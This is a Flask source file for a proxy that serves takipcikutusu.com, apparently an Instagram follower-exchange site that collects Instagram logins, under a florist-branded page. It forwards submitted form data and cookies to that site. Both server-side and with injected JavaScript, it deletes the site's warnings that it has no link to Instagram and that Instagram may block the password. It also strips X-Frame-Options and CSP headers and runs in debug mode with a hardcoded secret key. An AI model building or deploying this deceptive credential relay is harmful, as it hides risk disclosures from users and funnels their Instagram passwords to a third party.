from flask import Flask, render_template, request, Response
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)
app.secret_key = "zak-florist-secret-key-2025"

TARGET_BASE = "https://takipcikutusu.com"
PROXY_PREFIX = "/proxy"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "ar,fr;q=0.9,en;q=0.8",
    "Referer": TARGET_BASE,
}

TEXTS_TO_HIDE = [
    "Bu sitenin instagram ile hiçbir bağlantısı yoktur",
    "Bu site Havuz Sistemi",
    "Sürekli şifre yanlış hatası",
    "Burayı oku",
    "Giriş uzun sürebilir",
    "ilk girişte şifre yanlış",
    "Instagram şifrenizi bloke edebilir",
    "02/07/2022",
    "Login problems fixed",
    "Fixed the issue",
    "Kullanıcı adı ve şifreniz",
    "Instagram API sistemi",
    "anti-spam",
    "bendim",
    "Şifremi unuttum",
    "Şifremi",
    "Burayı takip etmeye devam edin",
]


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/member")
def member():
    return render_template("member.html", proxy_url=f"{PROXY_PREFIX}/member")


@app.route("/zak-florist")
def zak_florist():
    return render_template("zak-florist.html", proxy_url=f"{PROXY_PREFIX}/member")


@app.route(f"{PROXY_PREFIX}/<path:path>", methods=["GET", "POST"])
def proxy(path):
    target_url = f"{TARGET_BASE}/{path}"

    if request.query_string:
        target_url += "?" + request.query_string.decode()

    try:
        if request.method == "POST":
            r = requests.post(target_url, data=request.form, headers=HEADERS,
                              cookies=request.cookies, timeout=25,
                              allow_redirects=False)
        else:
            r = requests.get(target_url, headers=HEADERS,
                             cookies=request.cookies, timeout=25,
                             allow_redirects=False)
    except Exception as e:
        return f"<h2>خطأ في الاتصال</h2><p>{e}</p>", 502

    content_type = r.headers.get("Content-Type", "")

    if "text/html" in content_type:
        soup = BeautifulSoup(r.text, "html.parser")

        # إعادة كتابة الروابط
        for tag, attr in [("a", "href"), ("form", "action"),
                          ("link", "href"), ("script", "src"),
                          ("img", "src")]:
            for el in soup.find_all(tag):
                if el.get(attr):
                    val = el[attr]
                    if val.startswith("/"):
                        el[attr] = f"{PROXY_PREFIX}{val}"
                    elif val.startswith(TARGET_BASE):
                        el[attr] = val.replace(TARGET_BASE, PROXY_PREFIX)

        # حذف النصوص التركية (مع حماية من الأخطاء)
        for element in soup.find_all(string=True):
            try:
                if not element:
                    continue
                text = element.strip()
                if not text:
                    continue
                if not hasattr(element, "parent") or element.parent is None:
                    continue
                for bad in TEXTS_TO_HIDE:
                    if bad in text:
                        parent = element.parent
                        if parent and parent.name not in ["html", "body"]:
                            parent.decompose()
                        break
            except Exception:
                continue

        # إخفاء عناصر اللغة والترجمة
        try:
            for el in soup.find_all(class_=re.compile(
                    "language|lang|translate|footer|warning|info", re.I)):
                el.decompose()
        except Exception:
            pass

        # إضافة CSS و JS لتنظيف إضافي
        custom_style = soup.new_tag("style")
        custom_style.string = """
            body { font-family: 'Tahoma', sans-serif !important; }
            .footer, .warning, .info, .language, .lang { display: none !important; }
        """
        if soup.head:
            soup.head.append(custom_style)

        custom_js = soup.new_tag("script")
        custom_js.string = """
            document.addEventListener('DOMContentLoaded', function() {
                var bad = [
                    'Havuz Sistemi', 'Bu sitenin', 'şifre yanlış',
                    'Burayı oku', 'Giriş uzun', 'bloke edebilir',
                    'anti-spam', 'bendim', 'Şifremi unuttum',
                    'Burayı takip'
                ];
                var walker = document.createTreeWalker(
                    document.body, NodeFilter.SHOW_TEXT, null, false
                );
                var nodes = [];
                while (walker.nextNode()) nodes.push(walker.currentNode);
                nodes.forEach(function(node) {
                    bad.forEach(function(b) {
                        if (node.nodeValue.indexOf(b) !== -1) {
                            var p = node.parentElement;
                            if (p && p.tagName !== 'BODY' && p.tagName !== 'HTML') {
                                p.style.display = 'none';
                            }
                        }
                    });
                });
            });
        """
        if soup.body:
            soup.body.append(custom_js)

        html = str(soup)
    else:
        html = r.content

    resp = Response(html, status=r.status_code,
                    content_type=content_type or "text/html")
    for cookie in r.cookies:
        resp.set_cookie(cookie.name, cookie.value)

    resp.headers.pop("X-Frame-Options", None)
    resp.headers.pop("Content-Security-Policy", None)

    return resp


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
